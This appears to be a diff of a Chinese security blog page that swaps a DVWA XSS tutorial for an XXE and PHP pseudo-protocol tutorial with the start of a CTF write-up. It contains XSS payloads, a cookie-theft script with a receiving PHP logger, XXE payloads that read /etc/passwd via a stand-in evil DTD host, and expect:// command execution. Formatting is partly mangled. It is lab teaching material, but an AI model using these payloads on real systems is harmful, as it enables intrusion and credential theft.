@@ -6,28 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>web(四) | ckf&#39;s blog</title>
+  <title>ckf&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="简介：集训Day9，XSS漏洞原理与利用">
-<meta name="keywords" content="ctf,web">
+  <meta name="description" content="XML基础XML：可拓展标记语言  功能：标记电子文件使其具有结构性的标记语言，从而达到数据的传输与存储 XML组成模块 元素 属性 实体 PCDATA CDATA   元素  开始标签和闭合标签中的代码，可以嵌套，定义与HTML的元素一致  属性  标签可以拥有属性，属性总在开始标签中，以键值对的形式出现，定义与HTML的属性一致  1&amp;lt;img src=&amp;quot;computer.gif">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web(四)">
-<meta property="og:url" content="http://yoursite.com/2018/07/08/web-四/index.html">
+<meta property="og:title" content="ckf&#39;s blog">
+<meta property="og:url" content="http://yoursite.com/2019/03/29/XXE漏洞与伪协议/index.html">
 <meta property="og:site_name" content="ckf&#39;s blog">
-<meta property="og:description" content="简介：集训Day9，XSS漏洞原理与利用">
+<meta property="og:description" content="XML基础XML：可拓展标记语言  功能：标记电子文件使其具有结构性的标记语言，从而达到数据的传输与存储 XML组成模块 元素 属性 实体 PCDATA CDATA   元素  开始标签和闭合标签中的代码，可以嵌套，定义与HTML的元素一致  属性  标签可以拥有属性，属性总在开始标签中，以键值对的形式出现，定义与HTML的属性一致  1&amp;lt;img src=&amp;quot;computer.gif">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gamjabtj30vd0ggq4m.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gbs52qhj30vt0d5aat.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft3ltujwaaj30yu0gat9u.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005Z7H2Agy1ft3lu6k2b6j312b0ggq4k.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft3lul5gx6j30zd0ln0vd.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005Z7H2Agy1ft3lut0ho3j314p0k341h.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft3lv60g5dj30w40k0767.jpg">
-<meta property="og:updated_time" content="2018-07-09T06:43:41.091Z">
+<meta property="og:updated_time" content="2019-03-29T12:56:18.374Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="web(四)">
-<meta name="twitter:description" content="简介：集训Day9，XSS漏洞原理与利用">
-<meta name="twitter:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gamjabtj30vd0ggq4m.jpg">
+<meta name="twitter:title" content="ckf&#39;s blog">
+<meta name="twitter:description" content="XML基础XML：可拓展标记语言  功能：标记电子文件使其具有结构性的标记语言，从而达到数据的传输与存储 XML组成模块 元素 属性 实体 PCDATA CDATA   元素  开始标签和闭合标签中的代码，可以嵌套，定义与HTML的元素一致  属性  标签可以拥有属性，属性总在开始标签中，以键值对的形式出现，定义与HTML的属性一致  1&amp;lt;img src=&amp;quot;computer.gif">
   
     <link rel="alternative" href="/atom.xml" title="ckf&#39;s blog" type="application/atom+xml">
   
@@ -165,90 +156,108 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-web-四" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-XXE漏洞与伪协议" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      web(四)
-    </h1>
-  
-
-        
-        <a href="/2018/07/08/web-四/" class="archive-article-date">
-  	<time datetime="2018-07-08T05:04:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-08</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简介：集训Day9，XSS漏洞原理与利用<br><a id="more"></a></p>
-<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><hr>
-<p>XSS攻击全称跨站脚本攻击，XSS在客户端脚本安全中有着举足轻重的位置</p>
-<h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>攻击者通过“html注入”插入恶意脚本或篡改网页，当用户在浏览网页时，就会执行其中的恶意脚本</p>
-<h2 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h2><ol>
-<li>网络钓鱼，盗取各类用户账号</li>
-<li>窃取用户cookie</li>
-<li>强制弹窗</li>
-<li>页面挂马</li>
-<li>升级用户权限，进一步渗透网站</li>
-<li>传播跨站脚本蠕虫</li>
-</ol>
-<h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>常见，广泛但危害性不大，使用已经构造好的恶意URL发送给目标，诱使目标点击出发，只会执行一次</p>
-<p>DVWA例子</p>
+        <h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>XML：可拓展标记语言 </p>
+<p>功能：标记电子文件使其具有结构性的标记语言，从而达到数据的传输与存储</p>
+<h2 id="XML组成模块"><a href="#XML组成模块" class="headerlink" title="XML组成模块"></a>XML组成模块</h2><ul>
+<li>元素</li>
+<li>属性</li>
+<li>实体</li>
+<li>PCDATA</li>
+<li>CDATA</li>
+</ul>
 <ol>
-<li>Security-low</li>
-</ol>
-<p>图一：<br><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gamjabtj30vd0ggq4m.jpg" alt=""></p>
-<p>如图，该页面会把用户输入的参数直接输出到页面上。如果输入的是一段JS代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; alert(&quot;xss&quot;); &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>就会发现alert()函数在当前页面被执行了</p>
-<p>图二：<br><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gbs52qhj30vt0d5aat.jpg" alt=""></p>
-<p>查看源代码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;Hello &lt;script&gt; alert(&quot;xss&quot;); &lt;/script&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure></p>
-<p>我们所输入的Script脚本，已经被写入页面，这就完成了一次XSS攻击</p>
-<ol start="2">
-<li>Security-Medium</li>
-</ol>
-<p>原理相同，只是在原本的基础上加入了针对特定字符的过滤，需要进行绕过</p>
-<p>页面源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>分析后发现是使用了黑名单过滤，我们只需要利用大小写混用绕过即可</p>
-<p>图三:<br><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft3ltujwaaj30yu0gat9u.jpg" alt=""></p>
-<ol start="3">
-<li>Security-High</li>
-</ol>
-<p>页面源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>分析后发现，大小混用绕过已经不可行，得另想办法</p>
-<p>利用img，上传一张不存在的图片，其返回的erro中会附加有script，因此可以输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
-<p>图四：<br><img src="http://ww4.sinaimg.cn/large/005Z7H2Agy1ft3lu6k2b6j312b0ggq4k.jpg" alt=""></p>
-<h3 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h3><p>不需要用户点击特定的URL就能执行跨站脚本，攻击者可以事先将恶意JS代码上传或者储存到服务器中，只要受害者浏览包含此恶意的代码页面就会执行恶意代码</p>
-<p>DVWA例子</p>
-<ol>
-<li><p>Security-low<br>没有过滤，可以直接在message栏中输入恶意代码</p>
+<li><p>元素</p>
+<p> 开始标签和闭合标签中的代码，可以嵌套，定义与HTML的元素一致</p>
 </li>
-<li><p>Security-Medium</p>
+<li><p>属性</p>
+<p> 标签可以拥有属性，属性总在开始标签中，以键值对的形式出现，定义与HTML的属性一致</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;computer.gif&quot; /&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>实体</p>
+<p> 定义普通文本的变量</p>
+</li>
+<li><p>PCDATA</p>
+<p> parsed character data</p>
+<p> PCDATA是会被解析器解析的文本</p>
+</li>
+<li><p>CDATA</p>
+<p> 即普通的 character data</p>
+<p> 与PCDATA相反，是不会被解析器解析的文本</p>
 </li>
 </ol>
-<p>页面源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>发现针对message的过滤很多，对name的过滤较少。但name输入框对长度有限制，可以利用截包，无视其长度限制</p>
-<p>图五:<br><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft3lul5gx6j30zd0ln0vd.jpg" alt=""></p>
-<p>图六:<br><img src="http://ww4.sinaimg.cn/large/005Z7H2Agy1ft3lut0ho3j314p0k341h.jpg" alt=""></p>
-<ol start="3">
-<li>Security-High</li>
-</ol>
-<p>与中等难度原理相通，同样是通过在过滤较少的name一栏输入恶意代码，同时绕过方法与反射型high的绕过方法一样</p>
-<p>图七：<br><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft3lv60g5dj30w40k0767.jpg" alt=""></p>
-<p>成功</p>
-<h2 id="XSS盗用cookie登录"><a href="#XSS盗用cookie登录" class="headerlink" title="XSS盗用cookie登录"></a>XSS盗用cookie登录</h2><ol>
-<li>编写接受cookie的php脚本</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      $cookie=$_GET[‘cookie’];</span><br><span class="line">      file_put_contents(‘cookie.txt’,$cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>构造攻击盗取cookie脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=‘http://127.0.0.1/dvwa/cookie.php?cookie=’+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
+<p>注：XML允许用户自定义标签(当然也能自定义结构),比如<figure class="highlight plain"><figcaption><span>文档只使用在 HTML 标准中定义过的标签(当然结构也是预定义的)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## XML结构</span><br><span class="line">- 声明</span><br><span class="line">- DTD文档类型定义</span><br><span class="line">- 文档元素</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?xml version=”1.0” ?&gt;  #XML声明</p>
+<p>&lt;!DOCTYPE note[<br>    &lt;!ELEMENT note (to,from,heading,body)&gt;<br>    &lt;!ELEMENT to      (#PCDATA)&gt;<br>    &lt;!ELEMENT from    (#PCDATA)&gt;             #文档类型定义<br>    &lt;!ELEMENT heading (#PCDATA)&gt;<br>    &lt;!ELEMENT body    (#PCDATA)&gt;<br>]&gt;</p>
+<p><note></note></p>
+<p><to>George</to></p>
+<p><from>John                              #文档元素</from></p>
+<p><heading>Reminder</heading></p>
+<p><body>xxxxxxxx<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script></body><br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">## DTD 文档类型定义</span><br><span class="line"></span><br><span class="line">DTD作用是定义XML文档的合法构建模块</span><br><span class="line"></span><br><span class="line">使用形式：</span><br><span class="line"></span><br><span class="line">1、文档内声明</span><br></pre></td></tr></table></figure></p>
+<p>如同例子一样：&lt;!DOCTYPE 根元素 [元素声明]&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2、外部引用</span><br></pre></td></tr></table></figure></p>
+<p>具体说是引用外部的DTD</p>
+<p>&lt;!DOCTYPE 根元素 SYSTEM”文件名”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注：DTD文档的后缀名即为.dtd</span><br><span class="line"></span><br><span class="line">### DTD 实体</span><br><span class="line"></span><br><span class="line">实体前面提到过，基本就是变量</span><br><span class="line"></span><br><span class="line">DTD实体用于定义引用普通文本或特殊字符的快捷方式的变量，既可以内部声明也可以外部引用</span><br><span class="line"></span><br><span class="line">分类：</span><br><span class="line"></span><br><span class="line">1、内部实体变量</span><br></pre></td></tr></table></figure></p>
+<p>声明语法：&lt;!ENTITY 实体名 “实体内容”&gt;</p>
+<p>引用实体方式：&amp;实体名;</p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE test [<br>&lt;!ENTITY writer “Bill Gates”&gt;<br>&lt;!ENTITY copyright “Copyright W3School.com.cn”&gt;<br>]&gt;</p>
+<p><test>&writer;&copyright;</test><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2、外部实体变量(XXE根源)</span><br></pre></td></tr></table></figure></p>
+<p>声明语法：&lt;!ENTITY 实体名 SYSTEM”本地或远程服务器的文件”&gt;</p>
+<p>引用实体方式: &amp;实体名;  </p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE test [<br>&lt;!ENTITY writer “file:///etc/passwd”&gt;<br>]&gt;</p>
+<p><test>&writer;</test><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3、参数实体变量</span><br></pre></td></tr></table></figure></p>
+<p>声明语法：&lt;!ENTITY %实体名 SYSTEM “远程服务器上的XML文件”&gt;</p>
+<p>引用实体方式：%实体名;</p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE a [<br>    &lt;!ENTITY % d SYSTEM “<a href="http://testevil.com/evil.dtd&quot;&gt;" target="_blank" rel="noopener">http://testevil.com/evil.dtd&quot;&gt;</a><br>    %d;<br>]&gt;</p>
+<p>DTD文件中：<br>&lt;!ENTITY b SYSTEM “file:///etc/passwd”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注意：三种实体变量正对应着三种xxe的攻击方式，参数实体变量的使用容易和外部实体变量弄混</span><br><span class="line"></span><br><span class="line"># XXE 漏洞</span><br><span class="line"></span><br><span class="line">前置知识结束，XXE全称XML外部实体注入，本质上是XML中DTD允许使用外部实体，给予攻击者机会去将自定义的值发送给应用程序从而达到攻击者的目的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 攻击注入</span><br><span class="line"></span><br><span class="line">一、直接通过DTD外部实体声明</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;! DOCTYPE a[<br>    &lt;!ENTITY b SYSTEM “file:///etc/passwd”&gt;<br>]&gt;</p>
+<c>&b;</c><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">二、通过引入外部DTD文档，再引入文档中事先准备好的实体(引入外部实体声明)</span><br></pre></td></tr></table></figure><br><br>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE a SYSTEM “<a href="http://testevil.com/evil.dtd&quot;&gt;" target="_blank" rel="noopener">http://testevil.com/evil.dtd&quot;&gt;</a><br><c>&b;</c>
+
+<p>DTD文件中：<br>&lt;!ENTITY b SYSTEM “file:///etc/passwd”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">三、通过DTD外部实体声明后，再引入外部实体声明</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?xml version=”1.0”?&gt;<br>&lt;!DOCTYPE a [<br>    &lt;!ENTITY % d SYSTEM “<a href="http://testevil.com/evil.dtd&quot;&gt;" target="_blank" rel="noopener">http://testevil.com/evil.dtd&quot;&gt;</a><br>    %d;<br>]&gt;</p>
+<c>&amp;b</c>
+
+<p>DTD文件中：<br>&lt;!ENTITY b SYSTEM “file:///etc/passwd”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">在常规的攻击中有两种情况用到参数实体。</span><br><span class="line"></span><br><span class="line">1、读取的文件包括特殊字符。</span><br><span class="line"></span><br><span class="line">2、在XXE攻击没有回显的情况下，可以利用参数实体来获取回显数据。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 利用危害</span><br><span class="line"></span><br><span class="line">主要是使用服务端语言的伪协议进行攻击（服务端会解析外部实体），根据服务端语言的不同，可使用的协议也是不同的</span><br><span class="line"></span><br><span class="line">以下仅以PHP伪协议进行举例</span><br><span class="line"></span><br><span class="line">1、任意读文件</span><br></pre></td></tr></table></figure></p>
+<p>file:///path/to/file.ext<br><a href="http://url/file.ext" target="_blank" rel="noopener">http://url/file.ext</a><br>php://filter/read=convert.base64-encode/resource=conf.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2、执行系统命令</span><br></pre></td></tr></table></figure></p>
+<p>expect://id<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</span><br><span class="line"></span><br><span class="line">3、探测内网端口</span><br></pre></td></tr></table></figure></p>
+<p>http://<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">直接使用http协议，通过返回值来探测端口</span><br><span class="line"></span><br><span class="line">4、DDOS</span><br><span class="line"></span><br><span class="line"># Feedback--Securinets CTF Quals 2019 </span><br><span class="line">一道XXE利用的题，做的时候一直以为是xss，完全搞错了方向.....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">初见是一个普通的评论页面</span><br></pre></td></tr></table></figure></p>
+<div class="container-contact100"><br><br>  <div class="wrap-contact100"><br>    <form class="contact100-form validate-form" method="POST" onsubmit="func();return false;"><br>      <span class="contact100-form-title"><br>        Send Us A Feedback<br>      </span><br><br>      <div class="wrap-input100 validate-input" data-validate="Please enter your name"><br>        <input class="input100" type="text" name="name" placeholder="Full Name"><br>        <span class="focus-input100"></span><br>      </div>
+
+<pre><code>  &lt;div class=&quot;wrap-input100 validate-input&quot; data-validate = &quot;Please enter your email: e@a.x&quot;&gt;
+    &lt;input class=&quot;input100&quot; type=&quot;text&quot; name=&quot;email&quot; placeholder=&quot;E-mail&quot;&gt;
+    &lt;span class=&quot;focus-input100&quot;&gt;&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div class=&quot;wrap-input100 validate-input&quot; data-validate = &quot;Please enter your message&quot;&gt;
+    &lt;textarea class=&quot;input100&quot; name=&quot;feedback&quot; placeholder=&quot;Your Feedback&quot;&gt;&lt;/textarea&gt;
+    &lt;span class=&quot;focus-input100&quot;&gt;&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div class=&quot;container-contact100-form-btn&quot;&gt;
+    &lt;button class=&quot;contact100-form-btn&quot;&gt;
+      &lt;span&gt;
+        &lt;i class=&quot;fa fa-paper-plane-o m-r-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;
+        Send
+      &lt;/span&gt;
+    &lt;/button&gt;
+    &lt;div id=&quot;Message&quot; color=&quot;Blue&quot; type=&quot;text&quot;&gt;&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/form&gt;
+</code></pre><p>  </p></form></div><br></div><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中发现一串JS代码,该function创建了XML文档并发送到feed.php中</span><br></pre></td></tr></table></figure><p></p>
+<p>function func(){<br>    var xml = ‘’ +<br>        ‘&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;’ +<br>        ‘<feedback>‘ +<br>        ‘<author>‘ + $(‘input[name=”name”]’).val() + ‘</author>‘ +<br>        ‘<email>‘ + $(‘input[name=”email”]’).val() + ‘</email>‘ +<br>        ‘<content>‘ + $(‘input[name=”feedback”]’).val() + ‘</content>‘ +<br>        ‘</feedback>‘;<br>    var xmlhttp = new XMLHttpRequest();<br>    xmlhttp.onreadystatechange = function () {<br>        if(xmlhttp.readyState == 4){<br>            console.log(xmlhttp.readyState);<br>            console.log(xmlhttp.responseText);<br>            document.getElementById(‘Message’).innerHTML = xmlhttp.responseText;<br>        }<br>    }<br>    xmlhttp.open(“POST”,”feed.php”,true);<br>    xmlhttp.send(xml);<br>};<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp截包，Request headers + Request body</span><br></pre></td></tr></table></figure></p>
+<p>POST /feed.php HTTP/1.1<br>Host: web2.ctfsecurinets.com<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: <em>/</em><br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Referer: <a href="https://web2.ctfsecurinets.com/" target="_blank" rel="noopener">https://web2.ctfsecurinets.com/</a><br>Content-Type: text/plain;charset=UTF-8<br>Content-Length: 139<br>Connection: keep-alive<br>Cookie: _ga=GA1.2.182302694.1553391694</p>
+<p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</p>
